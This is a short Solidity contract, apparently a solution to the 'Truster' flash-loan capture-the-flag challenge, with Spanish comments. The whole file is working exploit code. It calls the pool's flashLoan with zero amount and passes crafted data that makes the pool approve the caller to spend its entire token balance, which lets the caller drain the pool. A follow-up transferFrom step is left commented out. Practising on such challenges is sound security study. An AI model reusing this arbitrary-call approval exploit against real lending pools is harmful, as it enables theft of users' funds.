// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external  returns (bool);
    function balanceOf(address account) external  returns (uint256);
    function transferFrom(address from,address to,uint256 amount) external returns (bool);

}

interface ITLD {
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external returns (bool);
}


contract exploitTruster {

    address pool;
    address token;

    constructor (address pool_, address token_) {
        pool = pool_;
        token = token_;
    }

    function exploit() public returns (bool) {

        //Balance del pool
        uint256 balance = IERC20(token).balanceOf(address(pool));

        //! Hacer el llamado al ERC20 con los parametros que se ejecutara desde el pool
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", msg.sender, balance);

        //Llamado al pool enviando la data como 4to parametro y aprobando al msg.sender para el movimiento de sus tokens
        ITLD(pool).flashLoan(0, msg.sender, address(token), data);

        //! Llamado al ERC20 para transferir todos los tokens 
        //! No funciona porque no se mino aun la transferencia de approve por lo que el msg.sender aun no tiene balance que transferir
        //bool aux;
        //aux = IERC20(token).transferFrom(address(pool),msg.sender,balance);

        return true;
    }

}